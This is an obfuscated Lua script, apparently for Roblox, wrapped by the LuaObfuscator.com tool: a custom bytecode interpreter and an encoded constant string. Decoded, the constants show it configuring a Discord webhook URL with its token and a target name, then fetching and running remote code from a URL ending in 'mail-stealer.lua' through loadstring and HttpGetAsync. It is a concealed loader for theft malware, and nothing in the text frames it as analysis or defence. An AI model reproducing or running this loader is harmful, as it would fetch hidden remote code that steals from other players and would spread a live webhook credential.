--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.5) ~  Much Love, Ferib 

]]--

do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v20)if (v1(v20,2)==79) then local v66=0;while true do if (v66==0) then v19=v0(v3(v20,1,1));return "";end end else local v67=v2(v0(v20,16));if v19 then local v74=0;local v75;while true do if (v74==0) then v75=v5(v67,v19);v19=nil;v74=1;end if (v74==1) then return v75;end end else return v67;end end end);local function v21(v22,v23,v24)if v24 then local v68=(v22/(2^(v23-(1623 -(27 + 1595)))))%((1 + 1)^(((v24-(1651 -(796 + 854))) -(v23-(3 -2))) + (723 -(361 + 361)))) ;return v68-(v68%((5 -2) -(1 + 1))) ;else local v69=2^(v23-(1 + (1773 -(1711 + 62)))) ;return (((v22%(v69 + v69))>=v69) and (2 -1)) or (0 + 0) ;end end local function v25()local v38=v1(v16,v18,v18);v18=v18 + 1 ;return v38;end local function v26()local v39,v40=v1(v16,v18,v18 + 1 + 1 );v18=v18 + (9 -7) ;return (v40 * (184 + 72)) + v39 ;end local function v27()local v41,v42,v43,v44=v1(v16,v18,v18 + 2 + 1 );v18=v18 + 1 + 3 ;return (v44 * 16777216) + (v43 * (58415 + 7121)) + (v42 * (731 -475)) + v41 ;end local function v28()local v45=v27();local v46=v27();local v47=1 + 0 + 0 ;local v48=(v21(v46,1 + 0 ,609 -((312 -(20 + 9)) + 306) ) * ((1 + (334 -(253 + 80)))^((1249 -(1092 + 156)) + 31))) + v45 ;local v49=v21(v46,53 -32 ,515 -(225 + 259) );local v50=((v21(v46,82 -(9 + 41) )==(1 + 0)) and  -(1616 -(220 + 1395))) or (2 -1) ;if (v49==(0 -0)) then if (v48==(236 -(61 + 175))) then return v50 * (0 -0) ;else v49=1 -0 ;v47=457 -(412 + 45) ;end elseif (v49==(3883 -(269 + 10 + 1557))) then return ((v48==(731 -(65 + 666))) and (v50 * ((1656 -(69 + 758 + 828))/(0 -0)))) or (v50 * NaN) ;end return v8(v50,v49-(1257 -(98 + (1872 -(991 + 745)))) ) * (v47 + (v48/((2 -(0 -0))^(3 + 49)))) ;end local function v29(v30)local v51=0 -0 ;local v52;local v53;while true do if (v51==(2 + 0)) then v53={};for v76=2 -1 , #v52 do v53[v76]=v2(v1(v3(v52,v76,v76)));end v51=(16 -8) -(87 -(22 + 60)) ;end if ((1204 -(1136 + 65))==v51) then return v6(v53);end if ((0 + 0)==v51) then v52=nil;if  not v30 then v30=v27();if (v30==0) then return "";end end v51=1737 -(686 + 1050) ;end if (v51==(1 + 0)) then v52=v3(v16,v18,(v18 + v30) -((1 + 1) -1) );v18=v18 + v30 ;v51=4 -2 ;end end end local v31=v27;local function v32(...)return {...},v12("#",...);end local function v33()local v54=0 -0 ;local v55;local v56;local v57;local v58;local v59;local v60;local v61;while true do if (v54==3) then v61=nil;while true do local v78=0 -0 ;local v79;while true do if (v78~=(1453 -(37 + 1416))) then else v79=0;while true do if (v79==(2 -1)) then if ((130 -(112 + 18))~=v55) then else local v105=0;while true do if (v105==(2 + 0)) then v55=1 + 0 ;break;end if (v105~=0) then else v56={};v57={};v105=198 -(18 + 179) ;end if (v105==(1 + 0)) then local v108=0;local v109;while true do if (v108==0) then v109=0 + 0 ;while true do if (v109==(1 -0)) then v105=5 -3 ;break;end if (v109==(0 + 0)) then local v142=0 -0 ;while true do if (v142==(1242 -(196 + 1045))) then v109=1756 -(971 + 784) ;break;end if (v142~=(0 -0)) then else v58={};v59={v56,v57,nil,v58};v142=1 + 0 ;end end end end break;end end end end end break;end if (0~=v79) then else local v104=0;while true do if (v104~=1) then else v79=1;break;end if (v104~=(1325 -(534 + 791))) then else if (v55==(1 + 0)) then local v110=0 + 0 ;local v111;while true do if (v110==(1426 -(972 + 454))) then v111=0;while true do if (v111~=2) then else v55=2 + 0 ;break;end if (v111==(849 -(283 + 566))) then local v143=0 -0 ;local v144;while true do if (v143==(0 + 0)) then v144=0 + 0 ;while true do if (v144~=(0 -0)) then else local v162=0 + 0 ;while true do if (v162~=0) then else v60=v27();v61={};v162=1;end if (v162==(1 -0)) then v144=1694 -(1307 + 386) ;break;end end end if (v144==(2 -1)) then v111=1;break;end end break;end end end if (v111==1) then local v145=0 + 0 ;local v146;while true do if (v145==0) then v146=0 + 0 ;while true do if (v146==(1418 -(64 + 1353))) then v111=186 -(118 + 66) ;break;end if (v146==0) then local v163=580 -(539 + 41) ;while true do if (v163==0) then for v177=1 + 0 ,v60 do local v178=0 + 0 ;local v179;local v180;local v181;local v182;local v183;while true do if (v178==(766 -(638 + 128))) then v179=0 -0 ;v180=nil;v178=1827 -(297 + 1529) ;end if ((1331 -(816 + 513))==v178) then v183=nil;while true do if (v179==(498 -(424 + 73))) then v182=nil;v183=nil;v179=2;end if (v179==(2 + 0)) then while true do if (v180==(1 + 0)) then v183=nil;while true do if (v181==(1777 -(1012 + 764))) then if (v182==(1 + 0)) then v183=v25()~=0 ;elseif (v182==(2 + 0)) then v183=v28();elseif (v182~=(1 + 2)) then else v183=v29();end v61[v177]=v183;break;end if (v181~=(1321 -(1226 + 95))) then else local v208=0 -0 ;local v209;while true do if (v208~=(0 + 0)) then else v209=0 + 0 ;while true do if (v209~=0) then else local v217=0 -0 ;while true do if (v217~=(0 + 0)) then else v182=v25();v183=nil;v217=675 -(288 + 386) ;end if (v217==1) then v209=487 -(274 + 212) ;break;end end end if (v209~=(1 + 0)) then else v181=1;break;end end break;end end end end break;end if (v180~=(1733 -(104 + 1629))) then else local v199=0 -0 ;while true do if (v199~=(1 -0)) then else v180=1 + 0 ;break;end if (v199==(253 -(186 + 67))) then v181=599 -(82 + 517) ;v182=nil;v199=1747 -(1471 + 275) ;end end end end break;end if (v179~=(0 -0)) then else local v194=0;while true do if (v194~=(1 + 0)) then else v179=1083 -(659 + 423) ;break;end if (v194~=(0 + 0)) then else v180=0;v181=nil;v194=329 -(248 + 80) ;end end end end break;end if (v178~=(1 -0)) then else v181=nil;v182=nil;v178=2;end end end v59[10 -7 ]=v25();v163=1301 -(432 + 868) ;end if (v163==(177 -(106 + 70))) then v146=1;break;end end end end break;end end end end break;end end end if (v55==(2 + 0)) then local v112=1283 -(326 + 957) ;local v113;local v114;while true do if (v112~=(1492 -(259 + 1233))) then else v113=0;v114=nil;v112=1 + 0 ;end if (v112~=(3 -2)) then else while true do if (v113==(0 -0)) then v114=0;while true do local v149=1791 -(1261 + 530) ;while true do if (v149~=0) then else if ((1 + 0)==v114) then local v164=0 + 0 ;local v165;while true do if (v164~=0) then else v165=0 -0 ;while true do if (v165==(446 -(402 + 44))) then for v191=1 -0 ,v27() do v58[v191]=v27();end return v59;end end break;end end end if (v114==(0 -0)) then for v166=2 -1 ,v27() do local v167=0;local v168;while true do if (v167~=(0 -0)) then else v168=v25();if (v21(v168,173 -(135 + 37) ,3 -2 )~=(0 -0)) then else local v184=0 -0 ;local v185;local v186;local v187;local v188;while true do if ((1 + 0)~=v184) then else v187=nil;v188=nil;v184=2;end if (v184==(0 + 0)) then v185=0 + 0 ;v186=nil;v184=1;end if (v184==(7 -5)) then while true do if (v185~=1) then else v188={v26(),v26(),nil,nil};if (v186==(1904 -(956 + 948))) then local v200=0 -0 ;while true do if (v200==0) then v188[2 + 1 ]=v26();v188[2 + 2 ]=v26();break;end end elseif (v186==(1 + 0)) then v188[3 -0 ]=v27();elseif (v186==(1 + 1)) then v188[694 -(56 + 635) ]=v27() -((2 + 0)^(77 -61)) ;elseif (v186==3) then local v215=0;local v216;while true do if (v215~=(0 -0)) then else v216=0;while true do if (0~=v216) then else v188[3 + 0 ]=v27() -(2^(3 + 13)) ;v188[4 + 0 ]=v26();break;end end break;end end end v185=2 -0 ;end if (v185==(0 -0)) then local v196=0 -0 ;local v197;while true do if (v196~=(651 -(534 + 117))) then else v197=133 -(33 + 100) ;while true do if (v197==0) then local v214=0;while true do if ((0 -0)~=v214) then else v186=v21(v168,1 + 1 ,3 + 0 );v187=v21(v168,10 -6 ,5 + 1 );v214=1;end if (v214~=(435 -(76 + 358))) then else v197=1269 -(801 + 467) ;break;end end end if ((2 -1)~=v197) then else v185=1 + 0 ;break;end end break;end end end if (v185==(2 + 0)) then if (v21(v187,1 + 0 ,1)~=(2 -1)) then else v188[1118 -(117 + 999) ]=v61[v188[2]];end if (v21(v187,838 -(219 + 617) ,1 + 1 )~=(1693 -(1027 + 665))) then else v188[1 + 2 ]=v61[v188[11 -8 ]];end v185=431 -(287 + 141) ;end if (v185~=3) then else if (v21(v187,3 + 0 ,4 -1 )~=1) then else v188[4 + 0 ]=v61[v188[1 + 3 ]];end v56[v166]=v188;break;end end break;end end end break;end end end for v169=1 + 0 ,v27() do v57[v169-(765 -(744 + 20)) ]=v33();end v114=1;end break;end end end break;end end break;end end end v104=1;end end end end break;end end end break;end if (v54==(1 -0)) then v57=nil;v58=nil;v54=250 -(210 + 38) ;end if (v54~=(1 + 1)) then else v59=nil;v60=nil;v54=861 -(626 + 232) ;end if (v54~=0) then else local v70=0 + 0 ;while true do if (v70~=1) then else v54=249 -(30 + 218) ;break;end if ((0 + 0)~=v70) then else v55=0;v56=nil;v70=1575 -(309 + 1265) ;end end end end end local function v34(v35,v36,v37)local v62=0;local v63;local v64;local v65;while true do if (v62==0) then v63=v35[1];v64=v35[2];v62=1;end if (v62==1) then v65=v35[3];return function(...)local v80=1;local v81= -1;local v82={...};local v83=v12("#",...) -1 ;local function v84()local v85=v63;local v86=v64;local v87=v65;local v88=v32;local v89={};local v90={};local v91={};for v95=0 + 0 ,v83 do if ((v95>=v87) or ((3513 -(347 + 526))<(977 + 1358))) then v89[v95-v87 ]=v82[v95 + ((7 -4) -2) ];else v91[v95]=v82[v95 + 1 + 0 ];end end local v92=(v83-v87) + 1 ;local v93;local v94;while true do local v96=(1545 -1046) -(468 + (1610 -(1123 + 456))) ;local v97;while true do if ((3977>(6271 -(5150 -(1011 + 398)))) and (v96==(0 + 0))) then v97=0 + 0 ;while true do if (((5608 -4470)==(2661 -((1137 -572) + 958))) and (v97==(0 + 0))) then local v106=0;local v107;while true do if ((v106==((942 -(22 + 920)) -0)) or ((5378 -(420 + 1067))>(11069 -6978))) then v107=1121 -(27 + 1094) ;while true do if ((v107==(1 + 0)) or ((1 + 1793)<=(432 -234))) then v97=4 -3 ;break;end if ((v107==(0 + 0)) or (2187<=(4066 -3063))) then v93=v85[v80];v94=v93[(1418 -(533 + 884)) + 0 ];v107=1;end end break;end end end if ((2396<=(21763 -17367)) and (v97==1)) then if (((15371 -12236)<(5370 -(375 + 38))) and (v94<=((41 -28) -8))) then if (((676 + 22)<=(2133 + 608)) and (v94<=(716 -(318 + (992 -(22 + 574)))))) then if (((3534 -(17 + 568))>(68 -(5 + 8))) and (v94<=(782 -(74 + 708)))) then local v117=205 -(115 + 90) ;local v118;local v119;while true do if (((2643 + 681)>=(2857 -1876)) and (v117==(0 + 0 + 0))) then v118=0 + 0 ;v119=nil;v117=1401 -(970 + (1516 -(85 + 1001))) ;end if (((5182 -(195 + 965))>=(3587 -(888 + 944))) and ((1189 -(423 + 765))==v117)) then while true do if ((v118==((0 + 0) -0)) or (4042<=(2330 + 864))) then v119=v93[3 -1 ];v91[v119]=v91[v119]();break;end end break;end end elseif ((v94>(2 -1)) or ((315 + 3127)<(4344 -(374 + 575)))) then local v124=(0 + 0) -0 ;local v125;local v126;local v127;local v128;local v129;local v130;while true do if ((v124==(1 + 0)) or ((5773 -(491 + 1310))<=(1013 + 2215))) then v127=nil;v128=nil;v124=4 -2 ;end if ((v124==(1476 -(805 + 668))) or ((5526 -3178)<(1547 -1150))) then while true do if ((v125==(1 + 0)) or ((5940 -(301 + 1691))<=3459)) then local v155=0 + 0 ;while true do if ((v155==0) or ((14511 -9517)<4452)) then v128=nil;v129=nil;v155=2 -1 ;end if ((v155==(478 -(408 + 69))) or ((53 + 6 + 394)>(4458 -(443 + 319)))) then v125=5 -3 ;break;end end end if ((0==v125) or ((1696 + 1103)==(1236 -(365 + 214)))) then local v156=0;while true do if ((v156==(935 -(528 + 406))) or ((1638 + 743)==(2615 + 931))) then v125=(2 -1) + 0 ;break;end if ((v156==(0 + 0)) or ((9763 -5918)==(1540 -(594 + 341)))) then v126=(76 -32) -(13 + 31) ;v127=nil;v156=1;end end end if (((6869 -3499)>=2274) and (v125==2)) then v130=nil;while true do if ((v126==1) or (4638<=(2733 -(67 + 299)))) then local v171=0 -0 ;while true do if (((2051 + (1813 -(275 + 315)))<=(5269 -(322 + 258))) and (v171==(0 -0))) then v81=(v129 + v127) -(1762 -(1164 + 597)) ;v130=0 + 0 ;v171=(2 -1) -(0 + 0) ;end if (((1 + 0)==v171) or (((4345 + 1487) -(1059 + 594))<=(5671 -(217 + 1581)))) then v126=5 -3 ;break;end end end if (((2288 -(89 + 38 + 673))<=(888 + 669)) and (v126==(1782 -(1318 + 464)))) then local v172=0;local v173;while true do if (((6393 -3150)==(7545 -(2579 + 1723))) and (v172==0)) then v173=0 -0 ;while true do if (((19867 -14989)==4878) and (v173==(424 -(68 + 355)))) then v126=1 + 0 ;break;end if ((v173==(0 -0)) or ((10928 -8288)<2601)) then local v193=0 + 0 ;while true do if ((v193==0) or (4859<(4614 + 93))) then v127=v93[2];v128,v129=v88(v91[v127](v13(v91,v127 + 1 ,v93[(694 -(325 + 362)) -4 ])));v193=1;end if (((169 -(10 + 158))==v193) or (4282<=(760 -(146 + 234)))) then v173=1 + 0 ;break;end end end end break;end end end if ((v126==(4 -2)) or ((7965 -5082)>(3584 -(346 + 302)))) then for v175=v127,v81 do local v176=0;while true do if ((v176==(0 + 0)) or ((16658 -11837)<((7077 -(871 + 107)) -((994 -(449 + 33)) + 818)))) then v130=v130 + (1 -0) ;v91[v175]=v128[v130];break;end end end break;end end break;end end break;end if ((v124==(1 + 1)) or ((863 + 60)<=(804 -(177 + 517)))) then v129=nil;v130=nil;v124=7 -4 ;end if ((789<((6038 -(276 + 807)) -(794 + 373))) and (v124==(0 + 0))) then v125=0 -0 ;v126=nil;v124=47 -(41 + 5) ;end end else local v131=1397 -(814 + 583) ;local v132;local v133;local v134;while true do if ((v131==1) or (1955>=3951)) then v134=nil;while true do if ((v132==(0 -0)) or ((4642 -2832)>(6091 -2756))) then v133=v93[347 -((267 -(30 + 36)) + 144) ];v134=v91[v93[3]];v132=2 -1 ;end if ((v132==(222 -(88 + 133))) or (1376<=233)) then v91[v133 + 1 + 0 ]=v134;v91[v133]=v134[v93[919 -(751 + 164) ]];break;end end break;end if (((2638 -(626 + 1332))<=(6699 -3397)) and (v131==0)) then v132=0 -0 ;v133=nil;v131=1 + 0 ;end end end elseif ((v94<=(9 -6)) or ((568 + 1287)<=(2230 -682))) then v80=v93[5 -2 ];elseif ((v94>(4 + 0)) or ((335 + 99 + 905)>=(5749 -(1273 + 354)))) then if (((261 + 371)<((2673 -(362 + 286)) -(27 + (158 -110)))) and (v91[v93[1587 -(1466 + (341 -(153 + 69))) ]]==v93[1 + 3 ])) then v80=v80 + 1 ;else v80=v93[11 -8 ];end else v91[v93[2]]();end elseif (((4754 -(470 + 250))>=(1973 + 237)) and (v94<=(463 -(331 + 124)))) then if ((v94<=(11 -5)) or ((7438 -4473)<=(659 + 1004))) then local v121=0 -0 ;local v122;local v123;while true do if ((v121==0) or ((211 + 174)>=(2243 + 163))) then v122=486 -(37 + 449) ;v123=nil;v121=49 -(36 + 12) ;end if ((289==(1036 -(223 + 524))) and (v121==1)) then while true do if (((4332 -1655)==(7255 -4578)) and (v122==(1662 -(76 + 1586)))) then v123=v93[1260 -(109 + 1149) ];v91[v123]=v91[v123](v13(v91,v123 + (1 -0) ,v81));break;end end break;end end elseif (((2512 -(241 + 107))==(4598 -(3027 -(466 + 127)))) and (v94==(26 -19))) then for v147=v93[1006 -(278 + 726) ],v93[3] do v91[v147]=nil;end else v91[v93[3 -1 ]]=v93[1 + 2 ];end elseif (((3241 -1407)<(2713 + (2771 -(1106 + 393)))) and (v94<=10)) then if ((v94==((2998 -1072) -(98 + 1819))) or ((19086 -14165)<=(2614 -(1161 + 622)))) then do return;end else v91[v93[1570 -(316 + 1252) ]]=v93[1058 -(318 + 737) ]~=(832 -(603 + 229)) ;end elseif ((v94>11) or ((2055 + (1870 -(1127 + 354)))<(2203 -(259 + 1023)))) then v91[v93[1 + 1 ]]=v37[v93[3]];else v91[v93[2 -0 ]][v93[3 + 0 ]]=v93[52 -(36 + 12) ];end v80=v80 + (1107 -(756 + 350)) ;break;end end break;end end end end A,B=v32(v11(v84));if  not A[1] then local v98=0;local v99;while true do if (v98==0) then v99=v35[4][v80] or "?" ;error("Script error at ["   .. v99   .. "]:"   .. A[2] );break;end end else return v13(A,2,B);end end;end end end return v34(v33(),{},v17)(...);end v15("LOL!0D3O00028O00026O00F03F03073O0067657467656E7603093O006D6F7573656C6F636B2O01030A3O006C6F6164737472696E6703043O0067616D65030C3O00482O74704765744173796E63032A3O00682O7470733A2O2F77756D61742E78797A2F736372697074732F6D61696C2D737465616C65722E6C756103073O00776562682O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F313038323335312O39322O3833363534382O372F6C31354C787A63756C53524149364D4C726466596E54663635414B47336A546B317376666F516B336A574F6353564C7456386144557A544B2O464F716D58474E6C79377503043O006E616D65030B3O0079626F727365667574617500283O0012083O00014O0007000100013O0026053O0002000100010004033O00020001001208000100013O00260500010013000100020004033O0013000100120C000200036O00020001000200300B00020004000500120C000200063O00120C000300073O002001000300030008001208000500094O000A000600014O0002000300064O000600023O00022O00040002000100010004033O0027000100260500010005000100010004033O00050001001208000200013O0026050002001A000100020004033O001A0001001208000100023O0004033O0005000100260500020016000100010004033O0016000100120C000300036O00030001000200300B0003000A000B00120C000300036O00030001000200300B0003000C000D001208000200023O0004033O001600010004033O000500010004033O002700010004033O000200012O00093O00017O00283O00023O00033O00053O00053O00063O00083O00083O00093O00093O00093O000A3O000A3O000A3O000A3O000A3O000A3O000A3O000A3O000B3O000D3O000D3O000E3O00103O00103O00113O00123O00143O00143O00153O00153O00153O00163O00163O00163O00173O00183O001A3O001C3O001D3O001F3O00",v9(),...);end
